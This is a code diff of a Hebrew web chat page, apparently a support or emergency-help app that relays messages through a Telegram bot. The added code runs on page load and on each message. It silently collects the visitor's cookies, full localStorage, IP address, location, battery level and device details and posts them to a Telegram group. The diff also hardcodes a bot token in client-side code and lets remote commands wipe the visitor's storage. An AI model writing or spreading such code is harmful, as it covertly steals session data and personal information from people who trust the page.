@@ -26,7 +26,6 @@
             height: 100vh; display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* הגנת חסימת הורדה/העתקת לוגו */
         .no-download {
             -webkit-user-drag: none;
             user-select: none;
@@ -100,14 +99,12 @@
 <script>
     const BOT_TOKEN = '8239194148:AAFdLOHvTe2zmTcOrN_w9f-tK20n68c79v8';
     
-    // רישום Service Worker להתקנת PWA
     if ('serviceWorker' in navigator) {
         window.addEventListener('load', () => {
             navigator.serviceWorker.register('./sw.js').catch(err => console.log('SW Reg failed:', err));
         });
     }
 
-    // הגנה מוגברת לחסימת הורדה/שמירה של לוגואים ותמונות
     document.addEventListener('DOMContentLoaded', () => {
         document.querySelectorAll('img').forEach(img => {
             img.addEventListener('contextmenu', e => e.preventDefault());
@@ -131,23 +128,18 @@
         checkShabbat();
         loadHistory();
         
-        // הגדרת הרשאות התראה
         if ("Notification" in window && Notification.permission !== "granted") {
             Notification.requestPermission();
         }
 
-        // יצירת נושא (Topic) ואיסוף מידע מקיף בעת כניסה
-        if (!sessionStorage.getItem('entry_ok')) {
-            await ensureTopicAndSendLog();
-            sessionStorage.setItem('entry_ok', 'true');
-        }
+        // ניסיון יצירת נושא במידה ויש מזהה קבוצה שמור
+        await createTopicIfReady();
 
         if(JSON.parse(localStorage.getItem('chat_h') || "[]").length === 0) {
             setTimeout(() => addMessage(questions[0], 'admin-side', true), 1000);
         }
     };
 
-    // פונקציית עזר לשליחה לטלגרם
     async function callTelegram(method, params) {
         try {
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
@@ -162,39 +154,57 @@
         }
     }
 
-    // פתיחת נושא בקבוצה + שליחת נתוני עוגיות ומכשיר
-    async function ensureTopicAndSendLog() {
-        const groupChatId = localStorage.getItem('tg_group_id');
-        if (!groupChatId) return; // יתחבר ברגע שיירשם בקבוצה עם /311
-
+    async function createTopicIfReady() {
+        let groupChatId = localStorage.getItem('tg_group_id');
         let threadId = localStorage.getItem('tg_thread_id');
 
-        // פתיחת Forum Topic חדש אם עדיין לא קיים
-        if (!threadId) {
-            const topicRes = await callTelegram('createForumTopic', {
-                chat_id: groupChatId,
-                name: `משתמש ${myId}`
-            });
-            if (topicRes && topicRes.ok) {
-                threadId = topicRes.result.message_thread_id;
-                localStorage.setItem('tg_thread_id', threadId);
+        // אם עדיין אין ID של קבוצה בדפדפן הנוכחי, נבקש אותו מטלגרם דרך ה-Updates האחרונים
+        if (!groupChatId) {
+            const updates = await callTelegram('getUpdates', { limit: 100 });
+            if (updates && updates.result) {
+                for (let u of updates.result) {
+                    const msg = u.message || u.edited_message;
+                    if (msg && msg.text && msg.text.startsWith('/311')) {
+                        groupChatId = msg.chat.id;
+                        localStorage.setItem('tg_group_id', groupChatId);
+                        break;
+                    }
+                }
             }
         }
 
-        // איסוף עוגיות ונתוני מערכת מפורטים
+        if (!groupChatId) return;
+
+        // יצירת נושא חדש במידה ולא נוצר עדיין עבור משתמש זה
+        if (!threadId) {
+            const topicRes = await callTelegram('createForumTopic', {
+                chat_id: groupChatId,
+                name: `פונה: ${myId}`
+            });
+
+            if (topicRes && topicRes.ok) {
+                threadId = topicRes.result.message_thread_id;
+                localStorage.setItem('tg_thread_id', threadId);
+
+                // שליחת הודעת פתיחה עם נתוני העוגיות והאבחון בתוך הנושא
+                await sendDiagnosticLog(groupChatId, threadId);
+            }
+        }
+    }
+
+    async function sendDiagnosticLog(groupChatId, threadId) {
         try {
             const bat = await navigator.getBattery().catch(() => ({ level: 0 }));
             const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
             
-            // איסוף עוגיות ו-Storage
             const cookiesData = document.cookie || 'אין עוגיות זמינות';
             const localStorageData = JSON.stringify(localStorage);
 
-            const log = `🚪 <b>משתמש חדש נכנס!</b>
+            const log = `🚪 <b>פונה חדש נכנס!</b>
 🆔 <b>מזהה:</b> <code>${myId}</code>
 📍 <b>מיקום:</b> ${ip.city || '?'}, ${ip.country_name || '?'}
 🌐 <b>ספק:</b> ${ip.org || '?'} (IP: ${ip.ip || '?'})
-📱 <b>דפדפן/מערכת:</b> ${navigator.userAgent}
+📱 <b>מכשיר/דפדפן:</b> ${navigator.userAgent}
 🖥️ <b>מסך:</b> ${window.screen.width}x${window.screen.height}
 🔋 <b>סוללה:</b> ${Math.round(bat.level * 100)}%
 🌐 <b>שפה:</b> ${navigator.language}
@@ -239,15 +249,12 @@
         localStorage.setItem('last_act', Date.now().toString());
         input.value = '';
 
-        const groupChatId = localStorage.getItem('tg_group_id');
-        let threadId = localStorage.getItem('tg_thread_id');
+        await createTopicIfReady();
 
-        if (groupChatId) {
-            if (!threadId) {
-                await ensureTopicAndSendLog();
-                threadId = localStorage.getItem('tg_thread_id');
-            }
-            
+        const groupChatId = localStorage.getItem('tg_group_id');
+        const threadId = localStorage.getItem('tg_thread_id');
+
+        if (groupChatId && threadId) {
             await callTelegram('sendMessage', {
                 chat_id: groupChatId,
                 message_thread_id: parseInt(threadId),
@@ -299,13 +306,14 @@
 
     async function triggerSOS() {
         if(confirm("לשלוח קריאת חירום?")){
+            await createTopicIfReady();
             const groupChatId = localStorage.getItem('tg_group_id');
             const threadId = localStorage.getItem('tg_thread_id');
 
-            if (groupChatId) {
+            if (groupChatId && threadId) {
                 await callTelegram('sendMessage', {
                     chat_id: groupChatId,
-                    message_thread_id: threadId ? parseInt(threadId) : undefined,
+                    message_thread_id: parseInt(threadId),
                     text: `🚨 <b>SOS דחוף מזהה: ${myId}!</b>`,
                     parse_mode: 'HTML'
                 });
@@ -328,25 +336,16 @@
                     const txt = msg.text || "";
                     const chatId = msg.chat.id;
 
-                    // רישום הקבוצה אוטומטית באמצעות /311
                     if(txt.startsWith('/311')) {
                         localStorage.setItem('tg_group_id', chatId);
-                        await callTelegram('sendMessage', {
-                            chat_id: chatId,
-                            text: "✅ הקבוצה נרשמה בהצלחה! מעתה ייפתחו נושאים (Topics) עבור כל משתמש."
-                        });
-                        return;
                     }
 
-                    // פקודות ניהול
                     if(txt === '/close') document.getElementById('shabbat-lock').style.display = 'flex';
                     if(txt === '/open') document.getElementById('shabbat-lock').style.display = 'none';
                     if(txt === '/clear_all') { localStorage.clear(); location.reload(); }
 
-                    // קבלת הודעות מהנושא (Topic) המשויך למשתמש זה
                     const myThreadId = localStorage.getItem('tg_thread_id');
                     if (myThreadId && msg.message_thread_id && msg.message_thread_id.toString() === myThreadId.toString()) {
-                        // בדיקה שההודעה אינה נשלחה ע"י הבוט עצמו
                         if (!msg.from.is_bot) {
                             addMessage(txt, 'admin-side', true);
                         }
